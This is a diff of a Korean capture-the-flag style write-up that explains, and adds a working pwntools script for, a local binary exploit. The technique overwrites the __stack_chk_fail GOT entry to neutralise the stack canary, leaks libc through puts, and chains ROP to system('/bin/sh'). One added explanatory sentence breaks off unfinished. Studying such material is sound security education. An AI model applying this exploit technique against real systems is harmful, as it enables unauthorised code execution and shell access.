@@ -252,8 +252,38 @@ int main(int argc, char *argv[]){
 
 - 익스플로잇 설계
 카나리가 있기 때문에, 이를 알아내야 하는데 릭 벡터를 일차원적으로 찾을 수는 없습니다. 따라서 카나리를 변조해야만 다음 단계로 넘어갈 수 있습니다. 그런데 스택 프레임 내부의 카나리 값이 기존 카나리 값과 달라지면 `__stack_chk_fail` 함수를 호출합니다. 따라서 이 함수의 `got` 영역을 변조하고 의도적으로 호출하도록 설계합니다. `bof` 크기가 크기 때문에 `got overwrite`에서 체이닝을 고려할 필요는 없고 `ret` 주소로만 변조해도 충분합니다. 이러면 그냥 다음 어셈블리어 코드가 실행되므로 카나리 체크는 없는 것과 마찬가지입니다. `pop rdi ; ret` 가젯이 있기 때문에 `bof`를 이용하여 `puts`를 호출하여 `libc_base`를 얻고 `ROP`를 수행하여 `system('/bin/sh')`를 호출합니다.
+이 때 `rbp`를 신경써주어야 합니다. `startup` 함수를 두 번 실행하기 때문에 첫 번째 `payload`의 `sfp` 값이 
 
 - 익스플로잇
+```python
+from pwn import *
+
+p = process('./got')
+e = ELF('./got')
+l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+pop_rdi = 0x4011fe
+ret = 0x40101a
+
+def w1(idx : int, msg : int):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b': ', str(idx).encode())
+    p.sendlineafter(b': ', str(msg).encode())
+
+def w2(msg : bytes):
+    p.sendlineafter(b'> ', b'2')
+    p.sendafter(b'!\n', msg)
+
+print(hex(e.bss()))
+w1((e.got['__stack_chk_fail'] - e.sym['wire']) // 8, 0x40101a)
+w2(b'a' * 0x110 + p64(e.bss() + 0x900) + p64(pop_rdi) + p64(e.got['read']) + p64(e.sym['puts']) + p64(e.sym['startup']))
+l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['read']
+print("libc_base = " + hex(l.address))
+
+binsh = list(l.search(b'/bin/sh'))[0]
+system = l.sym['system']
+p.sendafter(b'!', (b'a' * 0x110 + p64(e.bss() + 0x900) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)))
+p.interactive()
+```
 
 ---
 ### Chapter 8
